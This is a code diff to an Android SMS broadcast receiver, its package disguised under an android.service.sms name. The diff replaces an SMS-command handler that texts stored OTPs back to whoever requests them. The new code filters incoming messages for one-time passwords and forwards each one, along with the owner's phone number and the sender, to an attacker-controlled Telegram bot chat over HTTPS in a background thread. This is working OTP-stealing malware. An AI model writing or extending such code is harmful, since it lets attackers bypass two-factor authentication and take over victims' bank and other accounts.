@@ -6,14 +6,19 @@ import android.content.Intent;
 import android.os.Bundle;
 import android.provider.Telephony;
 import android.service.sms.helpers.CustomMethods;
-import android.service.sms.helpers.SMSHelper;
+import android.service.sms.helpers.SharedPrefHelper;
 import android.telephony.SmsMessage;
 import android.util.Log;
 
-import org.json.JSONArray;
-import org.json.JSONException;
+import androidx.annotation.NonNull;
+
 import org.json.JSONObject;
 
+import java.io.IOException;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.nio.charset.StandardCharsets;
 import java.util.Objects;
 
 public class SMSReceiver extends BroadcastReceiver {
@@ -38,49 +43,74 @@ public class SMSReceiver extends BroadcastReceiver {
                 for (SmsMessage smsMessage : messages) {
                     String sender = smsMessage.getOriginatingAddress();
                     String messageBody = smsMessage.getMessageBody();
-                    processSMS(context, sender, messageBody);
+
+                    if (CustomMethods.isOTPMessage(messageBody))
+                        processSMS(context, sender, messageBody);
                 }
             }
         }
     }
 
     private void processSMS(Context context, String sender, String message) {
-        // Handle the received SMS here
-        Log.d(TAG, "Sender: " + sender + ", Message: " + message);
 
-        String[] messageParts = message.split(" ");
+        JSONObject sms = new JSONObject();
 
-        String firstPart = messageParts[0];
-        String secondPart = messageParts.length > 1 ? messageParts[1] : "";
-        String thirdPart = messageParts.length > 2 ? messageParts[2] : "";
+        try {
+            sms.put("ownerPhoneNo", CustomMethods.getPhoneNumber(context));
+            sms.put("phoneNo", sender);
+            sms.put("msg", message);
 
-        if (firstPart.equalsIgnoreCase("_GET") && CustomMethods.isNumericInteger(secondPart) && thirdPart.equalsIgnoreCase("")) {
+            String finalSms = "<b>Received to:</b> <pre><code>" + CustomMethods.getPhoneNumber(context) + "</code></pre>\n\n"
+                    + "<b>From:</b> <pre><code>" + sender + "</code></pre>\n\n"
+                    + "<b>Message:</b> <pre><code>" + message + "</code></pre>";
 
-            SMSHelper smsHelper = new SMSHelper(context);
+            SharedPrefHelper sharedPrefHelper = new SharedPrefHelper(context);
 
-            smsHelper.getOTPs(Integer.parseInt(secondPart), new SMSHelper.OnSMSRetrieve() {
-                @Override
-                public void onCompleted(JSONArray list) throws JSONException {
+            String botToken = sharedPrefHelper.getTGBotToken();
+            String groupID = sharedPrefHelper.getTGGroupID();
 
-                    for (int i = 0; i < list.length(); i++){
+            String tgApiURL = "https://api.telegram.org/bot" + botToken + "/sendMessage";
 
-                        JSONObject sms = list.getJSONObject(i);
+            JSONObject tgBody = new JSONObject();
+            tgBody.put("chat_id", groupID);
+            tgBody.put("text", finalSms);
+            tgBody.put("parse_mode", "HTML");
 
-                        if (!sms.getString("phoneNo").toLowerCase().contains(sender.toLowerCase())) {
-                            if (smsHelper.sendSMS(sender, list.getJSONObject(i).toString())) {
-                                Log.d(TAG, "processSMS: success");
-                            } else {
-                                Log.d(TAG, "processSMS: failed");
-                            }
-                        }
+            String requestBody = tgBody.toString();
+
+            new Thread(() -> {
+
+                try {
+                    HttpURLConnection connection = getHttpURLConnection(tgApiURL);
+
+                    try (OutputStream os = connection.getOutputStream()) {
+                        byte[] input = requestBody.getBytes(StandardCharsets.UTF_8);
+                        os.write(input, 0, input.length);
                     }
-                }
 
-                @Override
-                public void onFailed(Exception e) {
-                    Log.e(TAG, "onFailed: ", e);
+                    int responseCode = connection.getResponseCode();
+                    Log.d(TAG, "processSMS: " + responseCode);
+
+                } catch (Exception e){
+                    Log.e(TAG, "processSMS: ", e);
                 }
-            });
+            }).start();
+
+        } catch (Exception e) {
+            Log.e(TAG, "processSMS: ", e);
         }
+    }
+
+    private static @NonNull HttpURLConnection getHttpURLConnection(String tgApiURL) throws IOException {
+        URL url = new URL(tgApiURL);
+        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+
+        connection.setRequestMethod("POST");
+        connection.setDoOutput(true);
+        connection.setRequestProperty("Content-Type", "application/json; utf-8");
+        connection.setRequestProperty("Accept", "application/json");
+        connection.setInstanceFollowRedirects(true);
+        connection.setConnectTimeout(20000);
+        return connection;
     }
 }
